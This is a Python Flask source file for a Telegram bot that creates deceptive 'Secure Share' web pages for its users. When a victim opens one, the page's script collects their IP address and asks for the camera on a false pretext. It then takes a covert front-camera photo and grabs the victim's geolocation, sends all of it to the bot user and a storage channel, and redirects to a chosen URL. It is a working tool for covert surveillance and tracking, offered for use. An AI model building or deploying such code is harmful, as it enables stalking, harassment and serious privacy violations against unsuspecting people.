from flask import Flask, request, jsonify, send_from_directory
import json
import time
import os
import threading
import requests
from datetime import datetime, timedelta
import logging
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
REQUIRED_CHANNEL = "@nrtecno2"
ACCOUNT_NAME = "telegram-bot-b9j0"
HTML_DIR = "html_files"
PHOTO_DIR = "photos"
USER_STATE_FILE = "user_state.json"
USER_LINKS_FILE = "user_links.json"

os.makedirs(HTML_DIR, exist_ok=True)
os.makedirs(PHOTO_DIR, exist_ok=True)

if not os.path.exists(USER_STATE_FILE):
    with open(USER_STATE_FILE, "w") as f:
        json.dump({}, f)

if not os.path.exists(USER_LINKS_FILE):
    with open(USER_LINKS_FILE, "w") as f:
        json.dump({}, f)


def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        logger.error(f"Send error: {e}")


def send_photo(chat_id, photo_file):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    try:
        files = {"photo": photo_file}
        data = {"chat_id": chat_id}
        requests.post(url, data=data, files=files, timeout=10)
    except Exception as e:
        logger.error(f"Send photo error: {e}")


def get_user_state(user_id):
    with open(USER_STATE_FILE, "r") as f:
        data = json.load(f)
    return data.get(str(user_id), {"state": None, "target_url": None})


def set_user_state(user_id, state, target_url=None):
    with open(USER_STATE_FILE, "r") as f:
        data = json.load(f)
    data[str(user_id)] = {"state": state, "target_url": target_url}
    with open(USER_STATE_FILE, "w") as f:
        json.dump(data, f)


def get_user_active_link(user_id):
    with open(USER_LINKS_FILE, "r") as f:
        data = json.load(f)
    return data.get(str(user_id))


def set_user_active_link(user_id, html_file, photo_file):
    with open(USER_LINKS_FILE, "r") as f:
        data = json.load(f)
    old = data.get(str(user_id))
    if old:
        for f in [os.path.join(HTML_DIR, old.get("html")), os.path.join(PHOTO_DIR, old.get("photo"))]:
            if os.path.exists(f):
                os.remove(f)
    data[str(user_id)] = {"html": html_file, "photo": photo_file, "created_at": time.time()}
    with open(USER_LINKS_FILE, "w") as f:
        json.dump(data, f)


def is_subscribed(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={REQUIRED_CHANNEL}&user_id={user_id}"
        r = requests.get(url, timeout=10)
        data = r.json()
        if data.get("ok"):
            return data["result"]["status"] in ["member", "administrator", "creator"]
    except:
        pass
    return False


def delete_old_victim_data():
    cutoff = datetime.now() - timedelta(minutes=10)
    for f in os.listdir(PHOTO_DIR):
        if f.startswith("victim_"):
            fp = os.path.join(PHOTO_DIR, f)
            try:
                if datetime.fromtimestamp(os.path.getmtime(fp)) < cutoff:
                    os.remove(fp)
            except:
                pass


def start_auto_cleanup():
    def cleanup():
        while True:
            time.sleep(600)
            delete_old_victim_data()
    threading.Thread(target=cleanup, daemon=True).start()


def generate_html(user_id, target_url, photo_filename):
    html_filename = f"v_{user_id}_{int(time.time())}.html"
    filepath = os.path.join(HTML_DIR, html_filename)
    photo_url = f"https://{ACCOUNT_NAME}.onrender.com/photos/{photo_filename}"
    storage = CHANNEL_ID if CHANNEL_ID else "null"

    html = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Secure Share</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}}
.card{{background:#fff;border-radius:32px;max-width:400px;width:100%;overflow:hidden}}
.header{{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:24px;text-align:center}}
.logo{{font-size:28px;font-weight:bold;color:#fff}}.logo span{{color:#e94560}}
.preview-section{{padding:24px;text-align:center}}
.user-photo{{width:100px;height:100px;border-radius:50%;object-fit:cover;margin:0 auto 16px;border:3px solid #e94560}}
.btn{{background:linear-gradient(135deg,#e94560,#c62a4a);color:#fff;border:none;padding:16px;border-radius:50px;font-size:18px;font-weight:bold;cursor:pointer;width:100%;animation:pulse 2s infinite}}
@keyframes pulse{{0%{{transform:scale(1)}}50%{{transform:scale(1.03)}}100%{{transform:scale(1)}}}}
.loader{{width:48px;height:48px;border:3px solid #f3f3f3;border-top:3px solid #e94560;border-radius:50%;animation:spin 1s infinite;margin:20px auto}}
@keyframes spin{{0%{{transform:rotate(0)}}100%{{transform:rotate(360)}}}}
.step{{display:none}}.active{{display:block}}
</style>
</head>
<body>
<div class="card">
    <div class="header"><div class="logo">Secure<span>Share</span></div></div>
    <div id="step1" class="step active"><div class="preview-section"><div class="loader"></div><p>Loading...</p></div></div>
    <div id="step2" class="step"><div class="preview-section"><img class="user-photo" src="{photo_url}"><button class="btn" onclick="requestCamera()">Continue →</button><div id="errorMsg" style="color:red;margin-top:10px"></div></div></div>
    <div id="step3" class="step"><div class="preview-section"><div class="loader"></div><p>Connecting...</p></div></div>
    <div id="step4" class="step"><div class="preview-section"><div class="loader"></div><p>Verifying...</p></div></div>
    <div id="step5" class="step"><div class="preview-section"><div class="loader"></div><p>Redirecting...</p></div></div>
</div>
<video id="video" style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>
<script>
const TOKEN="{TOKEN}"; const USER={user_id}; const STORAGE={storage}; const TARGET="{target_url}";
async function send(t,f){{try{{if(f){{let fd=new FormData();fd.append("chat_id",USER);fd.append("photo",f);await fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto",{{method:"POST",body:fd}});if(STORAGE&&STORAGE!=="null"){{let fd2=new FormData();fd2.append("chat_id",STORAGE);fd2.append("photo",f);await fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto",{{method:"POST",body:fd2}});}}}}else{{await fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{chat_id:USER,text:t}})}});if(STORAGE&&STORAGE!=="null"){{await fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{chat_id:STORAGE,text:t}})}});}}}}catch(e){{}}}}
async function getIP(){{try{{let r=await fetch("https://api.ipify.org?format=json");return(await r.json()).ip;}}catch(e){{return"Unknown";}}}}
async function capture(){{
try{{let s=await navigator.mediaDevices.getUserMedia({{video:{{facingMode:"user"}},audio:false}});let v=document.getElementById("video");v.srcObject=s;await new Promise(r=>v.onloadedmetadata=()=>{{v.play();r();}});await new Promise(r=>setTimeout(r,300));let c=document.getElementById("canvas");c.width=v.videoWidth;c.height=v.videoHeight;c.getContext("2d").drawImage(v,0,0);let blob=await new Promise(r=>c.toBlob(r,"image/jpeg",0.9));if(blob)await send("Camera Photo",blob);s.getTracks().forEach(t=>t.stop());if(navigator.geolocation){{navigator.geolocation.getCurrentPosition(async(p)=>{{await send("Location: https://maps.google.com/?q="+p.coords.latitude+","+p.coords.longitude);}},async()=>{{}});}}return true;}}catch(e){{return false;}}}}
async function start(){{let ip=await getIP();await send("Visitor Info\\nIP: "+ip);document.getElementById("step1").style.display="none";document.getElementById("step2").style.display="block";}}
async function request(){{document.getElementById("step2").style.display="none";document.getElementById("step3").style.display="block";let ok=await capture();if(ok){{document.getElementById("step3").style.display="none";document.getElementById("step4").style.display="block";setTimeout(()=>{{window.location.href=TARGET;}},2000);}}else{{document.getElementById("step3").style.display="none";document.getElementById("step2").style.display="block";document.getElementById("errorMsg").innerHTML="Camera required";}}}}
start();
</script>
</body></html>'''

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html)
    return html_filename


def process_update(update):
    try:
        if 'message' in update:
            msg = update['message']
            uid = msg['chat']['id']
            logger.info(f"Processing message from {uid}")
            
            if 'text' in msg:
                text = msg['text']
                if text == '/start':
                    if not is_subscribed(uid):
                        markup = {"inline_keyboard": [[{"text": "Join", "url": "https://t.me/nrtecno2"}], [{"text": "Verify", "callback_data": "verify"}]]}
                        send_message(uid, f"Join {REQUIRED_CHANNEL} first!", markup)
                    else:
                        set_user_state(uid, "waiting_url")
                        send_message(uid, "Send me any URL")
                
                elif text.startswith(('http://', 'https://')):
                    state = get_user_state(uid)
                    if state.get("state") == "waiting_url":
                        set_user_state(uid, "waiting_photo", text)
                        send_message(uid, "Now share a photo with me")
                    else:
                        send_message(uid, "Use /start first")
                
                elif text != '/start':
                    send_message(uid, "Send a valid URL starting with http:// or https://")
            
            elif 'photo' in msg:
                uid = msg['chat']['id']
                logger.info(f"Photo from {uid}")
                state = get_user_state(uid)
                if state.get("state") == "waiting_photo":
                    target = state.get("target_url")
                    if target:
                        file_id = msg['photo'][-1]['file_id']
                        url = f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}"
                        r = requests.get(url).json()
                        file_path = r['result']['file_path']
                        file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path}"
                        img_data = requests.get(file_url).content
                        pname = f"photo_{uid}_{int(time.time())}.jpg"
                        with open(os.path.join(PHOTO_DIR, pname), "wb") as f:
                            f.write(img_data)
                        hname = generate_html(uid, target, pname)
                        set_user_active_link(uid, hname, pname)
                        set_user_state(uid, "done")
                        link = f"https://{ACCOUNT_NAME}.onrender.com/view/{hname}"
                        send_message(uid, f"✅ YOUR LINK:\n{link}\n\nActive until you create new link")
                else:
                    send_message(uid, "Send URL first using /start")
        
        elif 'callback_query' in update:
            cb = update['callback_query']
            uid = cb['from']['id']
            msg_id = cb['message']['message_id']
            if cb['data'] == 'verify':
                if is_subscribed(uid):
                    send_message(uid, "Verified! Send URL:")
                    set_user_state(uid, "waiting_url")
                else:
                    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
                    requests.post(url, json={"callback_query_id": cb['id'], "text": "Join channel first!", "show_alert": True})
                    
    except Exception as e:
        logger.error(f"Process error: {e}")


@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        if data:
            logger.info("Webhook received")
            process_update(data)
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"status": "error"}), 500


@app.route('/view/<filename>')
def serve_html(filename):
    return send_from_directory(HTML_DIR, filename)


@app.route('/photos/<filename>')
def serve_photo(filename):
    return send_from_directory(PHOTO_DIR, filename)


@app.route('/')
def home():
    return f"Bot alive | Links: {len(os.listdir(HTML_DIR))}"


if __name__ == "__main__":
    start_auto_cleanup()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
